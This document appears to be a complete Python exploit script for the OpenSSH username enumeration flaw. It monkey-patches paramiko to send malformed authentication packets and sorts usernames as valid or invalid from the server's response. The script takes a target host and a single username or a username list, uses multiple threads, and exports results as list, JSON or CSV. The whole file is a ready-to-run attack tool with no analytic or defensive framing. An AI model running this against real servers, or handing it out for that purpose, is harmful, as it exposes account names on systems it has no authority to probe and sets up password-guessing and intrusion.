# this only works for outdated versions of OpenSSH

import argparse
import logging
import paramiko
import multiprocessing
import socket
import sys
import json

# store function we will overwrite to malform the packet
old_parse_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[
    paramiko.common.MSG_SERVICE_ACCEPT]

# create custom exception
class BadUsername(Exception):
    def __init__(self):
        pass

# create malicious "add_boolean" function to malform packet
def add_boolean(*args, **kwargs):
    pass

# create function to call when username was invalid
def call_error(*args, **kwargs):
    raise BadUsername()

# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result = old_parse_service_accept(*args, **kwargs)
    # return old add_boolean function so start_client will work again
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

# create function to perform authentication with malformed packet and desired username
def checkUsername(username, tried=0):
    sock = socket.socket()
    sock.connect((args.hostname, args.port))
    # instantiate transport
    transport = paramiko.transport.Transport(sock)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        # server was likely flooded, retry up to 3 times
        transport.close()
        if tried < 4:
            tried += 1
            return checkUsername(username, tried)
        else:
            print('[-] Failed to negotiate SSH transport')
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except BadUsername:
        return (username, False)
    except paramiko.ssh_exception.AuthenticationException:
        return (username, True)
    # Successful auth(?)
    raise Exception("There was an error. Is this the correct version of OpenSSH?")

def exportJSON(results):
    data = {"Valid": [], "Invalid": []}
    for result in results:
        if result[1] and result[0] not in data['Valid']:
            data['Valid'].append(result[0])
        elif not result[1] and result[0] not in data['Invalid']:
            data['Invalid'].append(result[0])
    return json.dumps(data)

def exportCSV(results):
    final = "Username, Valid\n"
    for result in results:
        final += result[0] + ", " + str(result[1]) + "\n"
    return final

def exportList(results):
    final = ""
    for result in results:
        if result[1]:
            final += result[0] + " is a valid user!\n"
        else:
            final += result[0] + " is not a valid user!\n"
    return final

# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error

# get rid of paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('hostname', type=str, help="The target hostname or IP address")
arg_parser.add_argument('--port', type=int, default=22, help="The target port")
arg_parser.add_argument('--threads', type=int, default=5, help="The number of threads to be used")
arg_parser.add_argument('--outputFile', type=str, help="The output file location")
arg_parser.add_argument('--outputFormat', choices=['list', 'json', 'csv'], default='list', type=str,
                        help="The output file format")
group = arg_parser.add_mutually_exclusive_group(required=True)
group.add_argument('--username', type=str, help="The single username to validate")
group.add_argument('--userList', type=str, help="The path to the file containing the list of usernames")
args = arg_parser.parse_args()

sock = socket.socket()
try:
    sock.connect((args.hostname, args.port))
    sock.close()
except socket.error:
    print('[-] Connecting to host failed. Please check the specified host and port.')
    sys.exit(1)

if args.username:  # single username passed in
    result = checkUsername(args.username)
    if result[1]:
        print(result[0] + " is a valid user!")
    else:
        print(result[0] + " is not a valid user!")
elif args.userList:  # username list passed in
    try:
        with open(args.userList, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[-] File not found: " + args.userList)
        sys.exit(3)
    except IOError:
        print("[-] File cannot be read: " + args.userList)
        sys.exit(3)
    except Exception as e:
        print("[-] Error occurred while reading the file: " + args.userList)
        print("Error details: " + str(e))
        sys.exit(3)
        
    if not usernames:
        print("[-] No usernames found in the file: " + args.userList)
        sys.exit(3)
    
    # map usernames to their respective threads
    pool = multiprocessing.Pool(args.threads)
    results = pool.map(checkUsername, usernames)
    
    try:
        with open(args.outputFile, "w") as outputFile:
            if args.outputFormat == 'list':
                outputFile.write(exportList(results))
            elif args.outputFormat == 'json':
                outputFile.write(exportJSON(results))
            elif args.outputFormat == 'csv':
                outputFile.write(exportCSV(results))
            else:
                print("".join(results))
            print("[+] Results successfully written to " + args.outputFile + " in " + args.outputFormat.upper() + " form.")
    except IOError:
        print("[-] Cannot write to outputFile: " + args.outputFile)
        sys.exit(5)
else:  # no usernames passed in
    print("[-] No usernames provided to check")
    sys.exit(4)

